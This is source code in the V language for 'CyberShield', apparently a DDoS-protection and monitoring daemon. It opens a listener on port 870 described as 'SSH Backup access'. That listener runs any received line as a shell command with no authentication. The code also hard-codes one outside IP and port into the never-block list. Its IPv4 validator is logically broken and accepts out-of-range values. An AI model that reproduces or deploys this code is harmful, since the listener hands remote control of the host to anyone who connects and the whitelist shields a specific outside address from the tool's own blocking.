module src 

import io
import os
import net
import time

import src.info
import src.utils
import src.config

pub struct Client
{
	pub mut:
		socket		net.TcpConn
		disable_ui	bool
}

pub struct GlobalSettings
{
	pub mut:
		key 				string
		session_id 			string

		/* User Plan Settings */
		notification_access int
		dump_access 		int
		filter_access 		int
		drop_access			int
}

pub struct CyberShield
{
	pub mut:
		/* Cyber Shield Settings */
		interfacee				string
		key 					string
		settings				GlobalSettings
		
		ips						[]info.Netstat
		cnc_port 				int
		cnc_listener			net.TcpListener
		fake_ssh_server			net.TcpListener
		clients					[]Client
		web_port				int


		/* Connection Gathering Information */
		hide_ip 				bool
		pps						int
		conn_info				info.Connection
		os_info					info.OS
		hw_info 				info.Hardware
		established_cons 		int
		close_wait_cons			int
		time_wait_cons			int

		/* Attack System Settings & Logs */
		drop_con_mode			bool
		blocked_ips				[]string
		ip_logs					map[string]string
		abused_port				[]int
		
		/* Configuration Settings */
		ui_mode					bool // Enable or Disable UI Mode for more proformance
		reset_tables			bool
		under_attack			bool
		theme					config.UI
		max_pps					int
		max_connections			int
		max_con_per_port		int
		auto_add_rules			bool
		auto_reset_rules		bool
		personal_rules 			[]string
		cfg_protected_ip		[]string
		cfg_protected_port 		[]int
}

/*
*
*	The Start Of CyberShield
*
*	- Start connection informaton
*	- Retrieve Protection settings from configuration file
*	- Retrieve IPs from system logs such as SSH, OpenVPN etc
*	- Start listener and retrieve hardware and OS informaton
*	- Start info grab and detecting ddos to protect.
*/
pub fn monitor(mut c CyberShield) 
{
	/* Setting up Cyber Shield settings */
	println("${utils.success_sym} Setting Up Cyber Shield Settings....")
	c.conn_info = info.connection(c.interfacee)
	c.cfg_protected_ip << "192.99.70.163"
	c.cfg_protected_port << 5472

	/* Retrieve configuration settings for CyberShield Protection */
	println("${utils.success_sym} Retrieving protection settings on from configuration file.....!")
	c.retrieve_protection()

	/* Retrieve Server Last Login IPs to Protect from being blocked */
	println("${utils.success_sym} Retrieving Server Last Login IPs to Protected....!")
	c.get_last_login_ips()
	
	/* Check if user wants to use rules from config file settings */
	if c.auto_reset_rules { 
		println("${utils.success_sym} Reseting IPTables and Re-adding all personal rules....!")
		c.add_personal_rules() 
	} 

	go c.start_cybershield(c.key)
	
	/* UI Mode */
	if c.ui_mode {
		println("${utils.success_sym} Setting up Monitor && SSH Backup Sockets.....")
		c.cnc_listener = net.listen_tcp(.ip6, ":888") or {
			println("[ X ] Error, Unable to start CyberShield listener....!")
			return 
		}

		c.fake_ssh_server = net.listen_tcp(.ip6, ":870") or {
			println("[ X ] Error, Unable to start CyberShield listener....!")
			return 
		}

		println("${utils.success_sym} Retrieving OS Information.....!")
		c.os_info = info.grab_os_info()
		c.hw_info = info.retrieve_hardware()
		
		println("${utils.success_sym} Starting Monitor Listener....!")
		go listener(mut &c)
		println("${utils.success_sym} Starting SSH Backup Socket Listener.....")
		go listen_ssh(mut &c)
	}

	println("${utils.success_sym} Starting Detector & Protection System.....!")
	/* Start protection */
	c.start_monitoring()
}

/* 
*
*	- License Authentication
*/
pub fn (mut c CyberShield) start_cybershield(lid string) 
{
	c.settings = GlobalSettings{key: lid}
	mut data := utils.validate(lid)
	if data == {} {
		println("[ X ] Error, No access to CyberShield....!")
		exit(0)
	}

	c.settings.notification_access 	= data['notification_access'].int()
	c.settings.dump_access 			= data['dump_acceess'].int()
	c.settings.filter_access 		= data['filter_access'].int()
	c.settings.drop_access 			= data['drop_access'].int()
	c.settings.key 					= lid
	c.key 							= lid
	// mut sid 			 			:= data['session_id']
}

/*
*	[FAKE SSH Protocol/ SSH Over TCP Socket]
*	- Listen for sockets for SSH Backup access
*/
pub fn listen_ssh(mut c CyberShield)
{
	for {
		println("${utils.success_sym} [SSH] Listening for sockets....!")
		mut ssh_client := c.fake_ssh_server.accept() or {
			println("[ X ] Unable to connect....!")
			continue
		}

		if c.under_attack { continue }
		go ssh_interaction(mut &c, mut ssh_client)
	}
}

pub fn ssh_interaction(mut c CyberShield, mut socket net.TcpConn) 
{
	socket.set_read_timeout(time.infinite)
	mut reader := io.new_buffered_reader(reader: socket)
	utils.set_title(mut socket, "CyberShield's SSH Socket Port | Backend SSH Access")
	socket.write_string("\x1b[32m[ + ] Welcome To CyberShield's SSH Interaction Server....!\x1b[39m\r\n") or { 0 }

	for {
		socket.write_string("[CyberShield@SSH] ~ # ") or { 0 }
		data := reader.read_line() or { "" }
		mut cmd_data := os.execute("${data}".replace("\n", "")).output.replace("\n", "\r\n")

		socket.write_string("${cmd_data}\r\n") or { 0 }
	}
}

/*
*	- Change theme
*/
pub fn (mut c CyberShield) set_theme(name string) 
{
	c.theme = config.new_theme(name)
}

/*
*	[MONITOR]
* 	- Listen for new users connecting via Socket
*/
pub fn listener(mut c CyberShield)
{
	for {
		println("${utils.success_sym} [Monitor] Listening for sockets....!")
		mut client := c.cnc_listener.accept() or { 
			println("[ X ] Socket rejected")
			time.sleep(30*time.second)
			continue 
		}
		
		// Add a socket rejecters when under attack mode
		if c.under_attack { continue }
		
		client.set_read_timeout(time.infinite)
		mut n := Client{socket: client}
		c.clients << n
		go start_displaying(mut &c, mut &n)
	}
}

/*
*	- Remove a socket once disconnected
*/
pub fn (mut c CyberShield) rm_socket(mut n net.TcpConn)
{
	mut t := 0
	for mut client in c.clients 
	{
		if client.socket == n { 
			println("[ X ] Socket Removed && Disconnected....")
			c.clients.delete(t)
			n.close() or { return }
			return
		}
		t++
	}
}

/*
*	- Retrieve Configuration Protection
*/
pub fn (mut c CyberShield) retrieve_protection() 
{
	mut protection_data := os.read_lines("assets/protection.shield") or {
		println("[ X ] Error, Unable to read config protection.shield file....!")
		return
	}

	mut ip_data := config.get_block_data(protection_data, "[@PROTECTED_IPS]").split("\n")
	for ip in ip_data { if ip != "" { c.cfg_protected_ip << ip } }

	mut port_data := config.get_block_data(protection_data, "[@PROTECTED_PORTS]").split("\n")
	for port in port_data { if port.int() != 0 { c.cfg_protected_port << port.int() } }

	c.personal_rules = config.get_block_data(protection_data, "[@PERSONAL_RULES]").split("\n")

	for line in protection_data
	{
		if line.ends_with("false") { continue }

		if line.trim_space().starts_with("max_connections") {
			c.max_connections = line.trim_space().replace("max_connections:", "").trim_space().int()
		} else if line.trim_space().starts_with("pps_to_filter") {
			if c.max_pps != 0 { continue }
			c.max_pps = line.trim_space().replace("pps_to_filter:", "").trim_space().int()
		} else if line.trim_space().starts_with("max_con_per_port") {
			c.max_con_per_port = line.trim_space().replace("max_con_per_port:", "").trim_space().int()
		} else if line.trim_space().starts_with("auto_reset_rules") {
			c.auto_reset_rules = line.trim_space().replace("auto_reset_rules:", "").trim_space().bool()
		} else if line.trim_space().starts_with("token") {
			c.key = line.trim_space().replace("token:", "").trim_space()
		}
	}
}

/*
*	- Get last login logs to protect anyone who has access to 
*	  the vps
*/
pub fn (mut c CyberShield) get_last_login_ips()
{
	mut unique_ips := []string{}
	mut last_logins := os.execute("last").output

	lines := last_logins.split("\n")

	for line in lines 
	{
		login_info := utils.rm_empty_elements(line.split(" "))
		if login_info.len != 10 { continue }
		chk := validate_ipv4_format(login_info[2])
		if chk { if login_info[2] !in unique_ips { unique_ips << login_info[2] } }
	}

	for prot_ip in unique_ips 
	{
		c.cfg_protected_ip << prot_ip
	}
}

pub fn validate_ipv4_format(ip string) bool 
{
	args := ip.split(".")
	if args.len != 4 { return false }

	if args[0].int() < 1 && args[0].int() > 255 { return false }
	if args[1].int() < 0 && args[1].int() > 255 { return false }
	if args[2].int() < 0 && args[2].int() > 255 { return false }
	if args[3].int() < 0 && args[3].int() > 255 { return false }

	return true
}

/* 
*	- Retrieve allowed IPs from OpenVPN logs to protect
*/
pub fn (mut c CyberShield) get_openvpn_ips()
{
	if !os.exists("/etc/openvpn/server/openvpn.log") 
	{
		println("${utils.failed_sym} Error, Unable to get OpenVPN log file....")
		return
	}

	lines := os.read_lines("/etc/openvpn/server/openvpn.log") or { [] }
	if lines == [] { 
		println("${utils.failed_sym} OpenVPN Logs file seems to be empty\r\n\t=>No IPs to Protect from OpenVPN....")
		return 
	}

	mut ips_found := 0
	for line in lines {

		// Parsing for lines starting with the format below
		// TCP connection established with [AF_INET]0.0.0.0:4444
		if line.starts_with("TCP connection established with") {
			ip_found := line.split("]")[1].split(":")[0]

			c.cfg_protected_ip << ip_found
			ips_found++
		}
	}

	if ips_found == 0 {
		println("${utils.failed_sym} No IPs were found in the OpenVPN Logs file....")
		return
	}

	println("${utils.success_sym} ${ips_found} IPs found in the OpenVPN logs and were added to the list of IPs to protect....!")
}